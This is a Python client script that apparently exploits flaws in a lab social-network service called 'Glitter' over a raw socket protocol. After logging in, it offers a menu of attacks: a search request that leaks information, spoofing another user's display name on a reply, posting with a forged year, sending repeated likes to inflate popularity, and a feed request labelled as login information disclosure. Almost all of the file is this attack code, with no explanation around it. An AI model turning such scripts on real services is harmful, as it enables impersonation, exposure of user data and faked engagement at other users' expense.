import socket
import re


LOGIN = """100#{gli&&er}{"user_name":"USER","password":"PASS","enable_push_notifications":true}##"""
CHECK_SUM = """110#{gli&&er}ASCI_CODE##"""

FORMAT = 'CODE#{gli&&er}{DATA}##'


IP = "ip"
GET_RECV = 1024
PORT = 1336

def search_bug(data):
    """
    Searches for a specific entry in the system.

    :param data: The search entry to be looked up.
    :type data: str
    """
    search_request = change_format("300", '"search_type":"SIMPLE","search_entry":"search_data"')
    data = search_request.replace("search_data", data)
    clientSocket.sendall(data.encode())
    print(clientSocket.recv(GET_RECV).decode())

def change_display_name(name):
    """
    Changes the display name for a reply.

    :param name: The new display name to be set.
    :type name: str
    """
    display_name_request = change_format("650", f'"glit_id":51979,"user_id":43264,"user_screen_name":"{name}","id":-1,"content":"tomorrow","date":"2024-06-22T13:31:56.769Z"')
    clientSocket.sendall(display_name_request.encode())
    print(clientSocket.recv(GET_RECV).decode())

def post_with_changed_year(year):
    """
    Posts a new glit with a changed year.

    :param year: The year to be set in the post's date.
    :type year: int
    """
    post_request = change_format("550", f'"feed_owner_id":43264,"publisher_id":43264,"publisher_screen_name":"dorianTheKing","publisher_avatar":"im1","background_color":"White","date":"{year}-06-22T13:47:11.485Z","content":"than","font_color":"black","id":-1')
    clientSocket.sendall(post_request.encode())
    print(clientSocket.recv(GET_RECV).decode())

def like_spam():
    """
    Sends multiple like requests to make the user appear more popular.
    """
    like_request = change_format("710", ('"glit_id":glitId,"user_id":43264,"user_screen_name":"user","id":-1'.replace("user", name)).replace("glitId",glit_id))
    for i in range(3):
        clientSocket.sendall(like_request.encode())
        print(clientSocket.recv(GET_RECV).decode())

def login_info_disclosure():
    """
    Retrieves login information disclosure.
    """
    login_request = change_format("500", '"feed_owner_id":43264,"end_date":"2024-06-23T13:51:35.369Z","glit_count":2')
    clientSocket.sendall(login_request.encode())
    print(clientSocket.recv(GET_RECV).decode())

def change_format(code, data):
    """
    Changes the format of the message to be sent.

    :param code: The operation code.
    :type code: str
    :param data: The data to be included in the message.
    :type data: str
    :return: The formatted message.:type: str
    """
    return FORMAT.replace("CODE", code).replace("DATA", data)

def menu():
    """
    Displays the menu of available actions.
    """
    print("1. Search Information Disclosure")
    print("2. Change Display Name for Reply")
    print("3. Change Year in New Glit")
    print("4. Make Me Famous with Likes")
    print("5. Login Information Disclosure")

def login_info():
    name = input("Enter your user name: ")
    password = input("Enter your password: ")
    return name,password


def main():
    """
    Main function to execute the client operations.
    """
    global clientSocket
    global name,passward
    global glit_id
    global LOGIN
    global CHECK_SUM
    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        clientSocket.connect((IP, PORT))
        name,passward = login_info()
        login_exm = LOGIN
        login_exm = login_exm.replace("USER", name).replace("PASS", passward)

        clientSocket.sendall(login_exm.encode())
        get_message = clientSocket.recv(GET_RECV).decode()
        print(get_message)
        login_error = re.search(r'109#',get_message)
        user_login = re.search(r'108#',get_message)
        illegal_user = re.search(r'952#',get_message)
        while login_error or illegal_user or user_login:
            login_error = illegal_user = user_login = False
            name = ""
            passward = ""
            name,passward = login_info()
            login_exm = LOGIN
            login_exm = login_exm.replace("USER", name).replace("PASS", passward)
            clientSocket.sendall(login_exm.encode())
            get_message = clientSocket.recv(GET_RECV).decode()
            print(get_message)
            login_error = re.search(r'109#',get_message)
            user_login = re.search(r'108#',get_message)
            illegal_user = re.search(r'952#',get_message)


        CHECK_SUM = CHECK_SUM.replace("ASCI_CODE", str(sum(ord(char) for char in name) + sum(ord(char) for char in passward)))#need to fix
        clientSocket.sendall(CHECK_SUM.encode())
        get_message= clientSocket.recv(GET_RECV).decode()
        print((get_message))
        match = re.search(r'id":(\d+)', get_message)
        if match:
            glit_id = match.group(1)
        print(glit_id)
        menu()
        choice = int(input("Enter your choice: "))
        if choice == 1:
            data = input("Enter search data: ")
            search_bug(data)
        elif choice == 2:
            name = input("Enter display name: ")
            change_display_name(name)
        elif choice == 3:
            year = int(input("Enter year: "))
            post_with_changed_year(year)
        elif choice == 4:
            like_spam()
        elif choice == 5:
            login_info_disclosure()



        clientSocket.close()
    except Exception as e:
        print(e)


if __name__ == "__main__":
    main()
